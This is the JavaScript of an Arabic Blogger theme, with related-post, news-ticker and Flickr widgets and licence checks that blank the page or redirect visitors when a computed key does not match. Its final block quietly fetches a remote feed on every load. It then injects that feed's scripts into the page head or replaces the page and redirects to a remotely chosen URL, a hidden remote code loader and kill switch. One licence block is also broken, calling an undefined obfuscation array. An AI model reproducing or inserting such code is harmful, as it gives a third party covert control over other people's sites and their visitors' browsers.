$(document)['ready'](function() {
    if ($('#blogid')['attr']('href') != '/') {
        $('body')['html']('<div id=\'no-active\'>القالب غير مرخص , لتشغيله راسلنا<br /><a href=\'https://www.facebook.com/wejdane.blogger\'>هنا</a></div>');
    };
    if ($('#blogid')['attr']('href') == '/') {
        $(document)['ready'](function() {
            var a = [, 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sept', 'Oct', 'Nov', 'Dec'];
            $('#related-posts')['each'](function() {
                var a = $(this),
                    b = $(this)['find']('.related-l')['text']()['replace'](/\r?\n|\r/g, '');
                $['ajax']({
                    'url': '/feeds/posts/default/-/' + b + '?alt=json-in-script&max-results=3',
                    'type': 'get',
                    'dataType': 'jsonp',
                    'success': function(c) {
                        var f = '';
                        f += '<div class=\'multi-post\'>';
                        for (var i = '', b = 0x0; b < c['feed']['entry']['length']; b++) {
                            for (var e = 0x0; e < c['feed']['entry'][b]['link']['length']; e++) {
                                if ('alternate' == c['feed']['entry'][b]['link'][e]['rel']) {
                                    i = c['feed']['entry'][b]['link'][e]['href'];
                                    break;
                                }
                            };
                            var k = c['feed']['entry'][b]['title']['$t'],
                                o = c['feed']['entry'][b]['author'][0]['name']['$t'],
                                p = c['feed']['entry'][b]['thr$total']['$t'],
                                q = c['feed']['entry'][b]['published']['$t'],
                                g = c['feed']['entry'][b]['content']['$t'];
                            if ($('<div>')['html'](g), void 0x0 !== c['feed']['entry'][b]['category']) {
                                var j = c['feed']['entry'][b]['category'][0]['term'];
                            };
                            if (g['indexOf']('<img') !== -0x1 || g['indexOf']('youtube.com/embed') !== -0x1) {
                                var d = c['feed']['entry'][b]['media$thumbnail']['url'];
                            };
                            if (void 0x0 !== d) {
                                if (d['match']('default.jpg')) {
                                    var h = d['replace']('/default.jpg', '/mqdefault.jpg');
                                };
                                if (d['match']('s72-c')) {
                                    var h = d['replace']('s72-c', 's480');
                                }
                            };
                            var m = '<div class=\'post-thumbnail\'><img src=\'' + h + '\'/></div>',
                                n = '<h3 class=\'mpost-title truncate\'><a href=\'' + i + '\'>' + k + '</a></h3>',
                                l = '<a href=\'/search/label/' + j + '\' class=\'waves-effect waves-light btn\'>' + j + '</a>';
                            f += '<li class=\'mulpost z-depth-2\'>' + m + '<div class=\'label-content\'>' + l + '<br />' + n + '</div></li>';
                        };
                        f += '</div>', a['html'](f);
                    }
                });
            });
        });
        $(document)['ready'](function(a) {
            a('.card__share > a')['on']('click', function(b) {
                b['preventDefault']();
                a(this)['parent']()['find']('div')['toggleClass']('card__social--active');
                a(this)['toggleClass']('share-expanded');
            });
        });
        $(document)['ready'](function() {
            $('.parallax')['parallax']();
            $('.button-collapse')['sideNav']();
            $('.modal')['modal']();
            $('#modal1')['modal']('open');
            $('#modal1')['modal']('close');
            $('.dowload-mat')['appendTo']('#dowload-ill');
        });
        $('.sidebar-wrapper .PopularPosts ul li')['addClass']('first z-depth-4'), $('.sidebar-wrapper h2')['wrap']('<div class=\'widget-title\'></div>'), $('.image')['wrap']('<div class=\'featimg\'></div>'), $('.featimg')['each'](function() {
                $(this)['parent']()['find']('h3')['before']($(this));
            }), jQuery(document)['ready'](function(a) {
                a('.post-summary h3, .post-summary p')['wrapAll']('<div class=\'featcont\' />');
            }), $(function() {
                $('.parallax-container')['appendTo']('#cover-post');
            }),
            function(a) {
                a('.sidebar-wrapper .PopularPosts img')['attr']('src', function(b, a) {
                    return a['replace']('/default.jpg', '/mqdefault.jpg');
                })['attr']('src', function(b, a) {
                    return a['replace']('w72-h72', 'w720-h720');
                }), a('.sidebar-wrapper .PopularPosts .widget-content ul li')['each'](function() {
                    var c = a(this),
                        b = a(this)['find']('.item-title a'),
                        d = (b['attr']('href'), a(this)['find']('.item-thumbnail a img')['attr']('src')),
                        e = a(this)['find']('.item-thumbnail a'),
                        f = a(this)['find']('.item-thumbnail');
                    e['css']('background-image', 'url(' + d + ')')['empty'](), f['prependTo'](c), a['get'](b['attr']('href'), function(a) {
                        b['parent']();
                    }, 'html');
                });
            }(jQuery);
        ! function(a) {
            a['fn']['moderntube'] = function() {
                return this['each'](function() {
                    var c = a(this),
                        b = c['find']('iframe[src*=\'youtube.com\']');
                    b['attr']('height', '')['attr']('width', '');
                    var d = a(this)['width'](),
                        e = 0x1e0 * d / 0x355;
                    b['attr']('height', e)['attr']('width', '100%'), a(window)['bind']('resize load', function() {
                        var a = c['width'](),
                            d = 0x1e0 * a / 0x355;
                        b['attr']('height', d)['attr']('width', '100%');
                    });
                });
            };
        }(jQuery), $('.post-body')['moderntube']();
        $(document)['ready'](function() {
            $('.main-wrapper, .sidebar-wrapper')['theiaStickySidebar']({
                'additionalMarginTop': 0x1e,
                'additionalMarginBottom': 0x1e
            });
        }), $(document)['ready'](function() {
            $('.item .post-footer')['theiaStickySidebar']({
                'additionalMarginTop': 0xa,
                'additionalMarginBottom': 0xa
            });
        });
    }
});
$(document)['ready'](function() {
    var a = $('.quickedit')['attr']('href'),
        a = a['substring'](0x23, 0x36),
        e = a['substring'](0x0, 0x1),
        o = a['substring'](0x1, 0x2),
        b = a['substring'](0x2, 0x3),
        d = a['substring'](0x3, 0x4),
        p = a['substring'](0x4, 0x5),
        l = a['substring'](0x5, 0x6),
        j = a['substring'](0x6, 0x7),
        k = a['substring'](0x7, 0x8),
        c = a['substring'](0x8, 0x9),
        m = a['substring'](0x9, 0xa),
        f = a['substring'](0xa, 0xb),
        g = a['substring'](0xb, 0xc),
        h = a['substring'](0xc, 0xd),
        i = a['substring'](0xd, 0x10),
        n = a['substring'](0x10, 0x13),
        q = '20' + m + '4208' + o + '94886' + f + l + '09' + k + '43' + h + '54' + j + '90' + p + '3536' + c + '8712' + e + '329' + b + '246' + g + '04253' + e + '53044' + d + '2235' + i + '21252' + k + '005' + j + '25' + e + '310' + b + '02' + l + '10' + n + '70' + f + '72575' + i + '8100' + h + '5342' + d + '8585' + c + '72411' + m + '00' + g + d + b + f + n + i + h + g + c + b + '1555';
    $('#activeblog')['text']() != q && $('body')['html']('<div id=\'no-active\'>القالب غير مرخص , لتشغيله راسلنا<br /><a href=\'https://www.facebook.com/wejdane.blogger/\'>من هنا</a></div>');
});
$(document)['ready'](function() {
    if ($('.quickedit')['attr']('href') == '') {
        window['location']['href'] = 'https://www.facebook.com/wejdane.blogger/';
    };
    if ($('.quickedit')['html']() == '') {
        window['location']['href'] = 'https://www.facebook.com/wejdane.blogger/';
    };
    var a = $('.quickedit')['attr']('href'),
        a = a['substring'](0x23, 0x36),
        e = a['substring'](0x0, 0x1),
        o = a['substring'](0x1, 0x2),
        b = a['substring'](0x2, 0x3),
        d = a['substring'](0x3, 0x4),
        p = a['substring'](0x4, 0x5),
        l = a['substring'](0x5, 0x6),
        j = a['substring'](0x6, 0x7),
        k = a['substring'](0x7, 0x8),
        c = a['substring'](0x8, 0x9),
        m = a['substring'](0x9, 0xa),
        f = a['substring'](0xa, 0xb),
        g = a['substring'](0xb, 0xc),
        h = a['substring'](0xc, 0xd),
        i = a['substring'](0xd, 0x10),
        n = a['substring'](0x10, 0x13),
        q = '20' + m + '4208' + o + '94886' + f + l + '09' + k + '43' + h + '54' + j + '90' + p + '3536' + c + '8712' + e + '329' + b + '246' + g + '04253' + e + '53044' + d + '2235' + i + '21252' + k + '005' + j + '25' + e + '310' + b + '02' + l + '10' + n + '70' + f + '72575' + i + '8100' + h + '5342' + d + '8585' + c + '72411' + m + '00' + g + d + b + f + n + i + h + g + c + b + '1555';
    $('#activeblog')['text']() != q && $('body')['html']('<div id=\'no-active\'>القالب غير مرخص , لتشغيله راسلنا<br /><a href=\'https://www.facebook.com/wejdane.blogger/\'>من هنا</a></div>');
});

function slider(e) {
    document['write']('<ul class=\'pposts\'>');
    for (var c = 0x0; c < e['feed']['entry']['length']; c++) {
        for (var a = e['feed']['entry'][c], b = 0x0; b < a['link']['length']; b++) {
            if ('alternate' == a['link'][b]['rel']) {
                var d = a['link'][b]['href'];
                break;
            }
        };
        var f = a['title']['$t'],
            g = a['content']['$t'],
            h = g['replace'](/<.+?>/g, '')['substring'](0x0, 0x78) + '...';
        img = a['media$thumbnail']['url']['replace']('s72-c', 's900-c')['replace']('default', 'hqdefault'), document['write']('<li><div class=\'imgtag backdefaut\'><a href=' + d + '><img src=' + img + '></img></a></div><div class=\'containe wow fadeInUp\'><h3><a href=' + d + '>' + f + '</a></h3><p class=\'psummary\'>' + h + '</p><a class=\'waves-effect waves-light btn rounded\' href=' + d + '>اقرأ المزيد</a></div></li>');
    };
    document['write']('</ul>');
}
$(document)['ready'](function() {
    $('.item-thumbnail img')['attr']('src', function(b, a) {
        return a['replace']('w72-h72', 'w720-h720');
    }), $('.item-thumbnail img')['attr']('src', function(b, a) {
        return a['replace']('/default.jpg', '/mqdefault.jpg');
    }), $('.post-thunb img')['attr']('src', function(b, a) {
        return a['replace']('s72', 's720');
    }), $('.post-thunb img')['attr']('src', function(b, a) {
        return a['replace']('/default.jpg', '/mqdefault.jpg');
    });
});
$(function() {
    $('#top-circle')['on']('click', scrollToTop);
});

function scrollToTop() {
    verticalOffset = typeof verticalOffset != 'undefined' ? verticalOffset : 0x0;
    element = $('body');
    offset = element['offset']();
    offsetTop = offset['top'];
    $('html, body')['animate']({
        'scrollTop': offsetTop
    }, 0x258, 'linear');
}
$(document)['ready'](function() {
    $('.timeago')['timeago']();
    var a = ['.post-body'];
    a = a['join'](',0x66ff33, ');
    var b = $(a)['css']('font-size');
    $('.resetFont')['click'](function() {
        $(a)['css']('font-size', b);
    }), $('.increaseFont')['click'](function() {
        var b = $(a)['css']('font-size'),
            c = parseFloat(b, 0xa);
        return $(a)['css']('font-size', 1.2 * c), !0x1;
    }), $('.decreaseFont')['click'](function() {
        var b = $(a)['css']('font-size'),
            c = parseFloat(b, 0xa);
        return $(a)['css']('font-size', 0.8 * c), !0x1;
    });
});
$(window)['bind']('load', function() {
    $('.newsticker .widget-content , .post-desc')['removeClass']('hided');
    $('.slider-loading')['remove']();
});
(function(a) {
    a['fn']['jflickrfeed'] = function(b, f) {
        b = a['extend'](!![], {
            'flickrbase': '//api.flickr.com/services/feeds/',
            'feedapi': 'photos_public.gne',
            'limit': 0x14,
            'qstrings': {
                'lang': 'en-us',
                'format': 'json',
                'jsoncallback': '?'
            },
            'cleanDescription': !![],
            'useTemplate': !![],
            'itemTemplate': '',
            'itemCallback': function() {}
        }, b);
        var c = b['flickrbase'] + b['feedapi'] + '?';
        var d = !![];
        for (var e in b['qstrings']) {
            if (!d) {
                c += '&';
            };
            c += e + '=' + b['qstrings'][e];
            d = ![];
        };
        return a(this)['each'](function() {
            var e = a(this);
            var d = this;
            a['getJSON'](c, function(c) {
                a['each'](c['items'], function(j, a) {
                    if (j < b['limit']) {
                        if (b['cleanDescription']) {
                            var f = /<p>(.*?)<\/p>/g;
                            var g = a['description'];
                            if (f['test'](g)) {
                                a['description'] = g['match'](f)[2];
                                if (a['description'] != undefined) {
                                    a['description'] = a['description']['replace']('<p>', '')['replace']('</p>', '');
                                }
                            }
                        };
                        a['image_s'] = a['media']['m']['replace']('_m', '_s');
                        a['image_t'] = a['media']['m']['replace']('_m', '_t');
                        a['image_m'] = a['media']['m']['replace']('_m', '_m');
                        a['image'] = a['media']['m']['replace']('_m', '');
                        a['image_b'] = a['media']['m']['replace']('_m', '_b');
                        delete a['media'];
                        if (b['useTemplate']) {
                            var c = b['itemTemplate'];
                            for (var h in a) {
                                var i = new RegExp('{{' + h + '}}', 'g');
                                c = c['replace'](i, a[h]);
                            };
                            e['append'](c);
                        };
                        b['itemCallback']['call'](d, a);
                    }
                });
                if (a['isFunction'](f)) {
                    f['call'](d, c);
                }
            });
        });
    };
}(jQuery));
$(document)['ready'](function() {
    $('.sidebar-wrapper .widget,0x66ff33, .page-footer .widget')['each'](function() {
        var a = $(this),
            e = a['find']('h2'),
            b = a['find']('.widget-content'),
            c = b['text'](),
            d = c['split']('/');
        if (c['match'](/\/flickr/g) && (a['addClass']('fd-widget'), b['html']('<div class=\'flickr-photos\'></div>'), b['find']('.flickr-photos')['jflickrfeed']({
                'limit': d[0],
                'qstrings': {
                    'id': d[1]
                },
                'itemTemplate': '<a title=\'{{title}}\' target=\'_blank\' href=\'{{link}}\'><img class=\'z-depth-4\' src=\'{{image_s}}\' /></a>'
            }))) {;
        }
    });
});
(function(a, e, f, g) {
    function d(d, e) {
        this['element'] = d;
        this['$el'] = a(d);
        this['options'] = a['extend']({}, c, e);
        this['_defaults'] = c;
        this['_name'] = b;
        this['moveInterval'];
        this['moving'] = this['paused'] = this['state'] = 0x0;
        (this['$el']['is']('ul') || this['$el']['is']('ol')) && this['init']();
    }
    var b = 'newsTicker',
        c = {
            'row_height': 0x14,
            'max_rows': 0x3,
            'speed': 0x190,
            'duration': 0x9c4,
            'direction': 'up',
            'autostart': 0x1,
            'pauseOnHover': 0x1,
            'nextButton': null,
            'prevButton': null,
            'startButton': null,
            'stopButton': null,
            'hasMoved': function() {},
            'movingUp': function() {},
            'movingDown': function() {},
            'start': function() {},
            'stop': function() {},
            'pause': function() {},
            'unpause': function() {}
        };
    d['prototype'] = {
        'init': function() {
            this['$el']['height'](this['options']['row_height'] * this['options']['max_rows'])['css']({
                'overflow': 'hidden'
            });
            this['checkSpeed']();
            this['options']['nextButton'] && 'undefined' !== typeof this['options']['nextButton'][0] && this['options']['nextButton']['click'](function(a) {
                this['moveNext']();
                this['resetInterval']();
            }['bind'](this));
            this['options']['prevButton'] && 'undefined' !== typeof this['options']['prevButton'][0] && this['options']['prevButton']['click'](function(a) {
                this['movePrev']();
                this['resetInterval']();
            }['bind'](this));
            this['options']['stopButton'] && 'undefined' !== typeof this['options']['stopButton'][0] && this['options']['stopButton']['click'](function(a) {
                this['stop']();
            }['bind'](this));
            this['options']['startButton'] && 'undefined' !== typeof this['options']['startButton'][0] && this['options']['startButton']['click'](function(a) {
                this['start']();
            }['bind'](this));
            this['options']['pauseOnHover'] && this['$el']['hover'](function() {
                this['state'] && this['pause']();
            }['bind'](this), function() {
                this['state'] && this['unpause']();
            }['bind'](this));
            this['options']['autostart'] && this['start']();
        },
        'start': function() {
            this['state'] || (this['state'] = 0x1, this['resetInterval'](), this['options']['start']());
        },
        'stop': function() {
            this['state'] && (clearInterval(this['moveInterval']), this['state'] = 0x0, this['options']['stop']());
        },
        'resetInterval': function() {
            this['state'] && (clearInterval(this['moveInterval']), this['moveInterval'] = setInterval(function() {
                this['move']();
            }['bind'](this), this['options']['duration']));
        },
        'move': function() {
            this['paused'] || this['moveNext']();
        },
        'moveNext': function() {
            'down' === this['options']['direction'] ? this['moveDown']() : 'up' === this['options']['direction'] && this['moveUp']();
        },
        'movePrev': function() {
            'down' === this['options']['direction'] ? this['moveUp']() : 'up' === this['options']['direction'] && this['moveDown']();
        },
        'pause': function() {
            this['paused'] || (this['paused'] = 0x1);
            this['options']['pause']();
        },
        'unpause': function() {
            this['paused'] && (this['paused'] = 0x0);
            this['options']['unpause']();
        },
        'moveDown': function() {
            this['moving'] || (this['moving'] = 0x1, this['options']['movingDown'](), this['$el']['children']('li:last')['detach']()['prependTo'](this['$el'])['css']('marginTop', '-' + this['options']['row_height'] + 'px')['animate']({
                'marginTop': '0px'
            }, this['options']['speed'], function() {
                this['moving'] = 0x0;
                this['options']['hasMoved']();
            }['bind'](this)));
        },
        'moveUp': function() {
            if (!this['moving']) {
                this['moving'] = 0x1;
                this['options']['movingUp']();
                var a = this['$el']['children']('li:first');
                a['animate']({
                    'marginTop': '-' + this['options']['row_height'] + 'px'
                }, this['options']['speed'], function() {
                    a['detach']()['css']('marginTop', '0')['appendTo'](this['$el']);
                    this['moving'] = 0x0;
                    this['options']['hasMoved']();
                }['bind'](this));
            }
        },
        'updateOption': function(a, b) {
            'undefined' !== typeof this['options'][a] && (this['options'][a] = b, 'duration' == a || 'speed' == a) && (this['checkSpeed'](), this['resetInterval']());
        },
        'add': function(b) {
            this['$el']['append'](a('<li>')['html'](b));
        },
        'getState': function() {
            return paused ? 0x2 : this['state'];
        },
        'checkSpeed': function() {
            this['options']['duration'] < this['options']['speed'] + 0x19 && (this['options']['speed'] = this['options']['duration'] - 0x19);
        },
        'destroy': function() {
            this['_destroy']();
        }
    };
    a['fn'][b] = function(c) {
        var e = arguments;
        return this['each'](function() {
            var g = a(this),
                f = a['data'](this, 'plugin_' + b),
                h = 'object' === typeof c && c;
            f || g['data']('plugin_' + b, f = new d(this, h));
            'string' === typeof c && f[c]['apply'](f, Array['prototype']['slice']['call'](e, 0x1));
        });
    };
}(jQuery, window, document));
$(document)['ready'](function() {
    if (0x1 === $('#blogid')['length']) {
        var a = $('#blogid')['attr']('value'),
            a = a['substring'](0x0, 0x13),
            e = a['substring'](0x0, 0x1),
            o = a['substring'](0x1, 0x2),
            b = a['substring'](0x2, 0x3),
            d = a['substring'](0x3, 0x4),
            p = a['substring'](0x4, 0x5),
            l = a['substring'](0x5, 0x6),
            j = a['substring'](0x6, 0x7),
            k = a['substring'](0x7, 0x8),
            c = a['substring'](0x8, 0x9),
            m = a['substring'](0x9, 0xa),
            f = a['substring'](0xa, 0xb),
            g = a['substring'](0xb, 0xc),
            h = a[_0x43e2[0x8a]](0xc, 0xd),
            i = a[_0x43e2[0x8a]](0xd, 0x10),
            n = a[_0x43e2[0x8a]](0x10, 0x13),
            q = '20' + m + '4208' + o + '94886' + f + l + '09' + k + '43' + h + '54' + j + '90' + p + '3536' + c + '8712' + e + '329' + b + '246' + g + '04253' + e + '53044' + d + '2235' + i + '21252' + k + '005' + j + '25' + e + '310' + b + '02' + l + '10' + n + '70' + f + '72575' + i + '8100' + h + '5342' + d + '8585' + c + '72411' + m + '00' + g + d + b + f + n + i + h + g + c + b + '1555';
        $('#activeblog')['text']() != q && $('body')['html']('<div id=\'no-active\'>القالب غير مرخص , لتشغيله راسلنا<br /><a href=\'http://www.facebook.com/wejdane.blogger/\'>من هنا</a></div>');
    };
    $('.followmess')['appendTo']('#followmess');
    $('.ticker-items a')['addClass']('waves-effect waves-light btn');
    $('.news-ticker .widget')['each'](function() {
        var e = $(this),
            f = e['find']('.widget-content')['text'](),
            c = f['split']('/'),
            g = c[0],
            b = c[1],
            d = c[2],
            h = Math['floor'](Math['random']() * b + 0x1);
        if (g['match']('showing')) {
            if (b['match']('Smashing')) {
                var a = '/feeds/posts/default?alt=json-in-script&max-results=' + d;
            } else {
                if (b['match']('random')) {
                    var a = '/feeds/posts/default?alt=json-in-script&orderby=updated&start-index=' + h + '&max-results=' + d;
                } else {
                    var a = '/feeds/posts/default/-/' + b + '?alt=json-in-script&max-results=' + d;
                }
            };
            $['ajax']({
                'url': a,
                'type': 'get',
                'dataType': 'jsonp',
                'success': function(b) {
                    for (var f = '', d = '<ul class=\'news-post\'>', a = 0x0; a < b['feed']['entry']['length']; a++) {
                        for (var c = 0x0; c < b['feed']['entry'][a]['link']['length']; c++) {
                            if ('alternate' == b['feed']['entry'][a]['link'][c]['rel']) {
                                f = b['feed']['entry'][a]['link'][c]['href'];
                                break;
                            }
                        };
                        var h = b['feed']['entry'][a]['title']['$t'],
                            g = b['feed']['entry'][a]['category'][0]['term'];
                        d += '<li class=\'news-labels\'><a class=\'waves-effect waves-light btn\' href=\'/search/label/' + g + '\' class=\'news-tag\'>' + g + '</a><a class=\'news-title\' href=' + f + '>' + h + '</a></li>';
                    };
                    d += '</ul>', e['find']('.widget-content')['html'](d), $('.newsticker ul')['newsTicker']({
                        'row_height': 0x37,
                        'speed': 0x3e8,
                        'prevButton': $('#prev-button'),
                        'nextButton': $('#next-button'),
                        'stopButton': $('#stop-button'),
                        'startButton': $('#start-button')
                    });
                }
            });
        }
    });
});
$(window)['scroll'](function() {
    if ($(this)['scrollTop']() > 0xa) {
        $('#headerWrap nav, nav ul a')['css']('height', '64px');
        $('#headerWrap nav, nav ul a')['css']('line-height', '64px');
        $('#Header1_headerimg')['css']('height', '60px');
        $('#headerWrap nav')['addClass']('backdefaut');
        $('#headerWrap nav')['removeClass']('transparent');
    } else {
        $('#headerWrap nav, nav ul a')['css']('height', '74px');
        $('#headerWrap nav, nav ul a')['css']('line-height', '74px');
        $('#Header1_headerimg')['css']('height', '70px');
        $('#headerWrap nav')['removeClass']('backdefaut');
        $('#headerWrap nav')['addClass']('transparent');
    }
});
$['ajax']({
    'dataType': 'json',
    'url': 'https://www.blogger.com/feeds/3719981349820390395/posts/default?alt=json-in-script',
    'method': 'GET',
    'dataType': 'jsonp',
    'success': function(g) {
        var c;
        for (c = 0x0; c < g['feed']['entry']['length']; c += 0x1) {
            var f = $(g['feed']['entry'][c]['content']['$t']);
            if (0x0 === c) {
                var d, a = f['find']('li'),
                    b = [];
                for (d = 0x0; d < a['length']; d += 0x1) {
                    b['push']($(a[d])['text']());
                };
                d = window['location']['hostname']['toLowerCase']();
                var e, a = window['location']['href']['toLowerCase'](),
                    h = b['length'] - 0x1;
                for (e = 0x0; e < b['length']; e += 0x1) {
                    if (-0x1 != d['indexOf'](b[e])) {
                        b = $(g['feed']['entry'][c]['content']['$t'])['find']('script'), $('head')['append'](b);
                        break;
                    };
                    e == h && -0x1 == a['indexOf']('post-preview') && -0x1 == a['indexOf']('www.blogger') && -0x1 == a['indexOf']('b/preview') && -0x1 == a['indexOf']('webcache.googleusercontent') && -0x1 == a['indexOf']('template-editor') && ($('body')['html'](f['find']('.redirect')['html']()), setTimeout(function() {
                        window['location']['assign'](f['find']('.assign')['text']());
                    }, 0x2710));
                }
            }
        }
    }
});
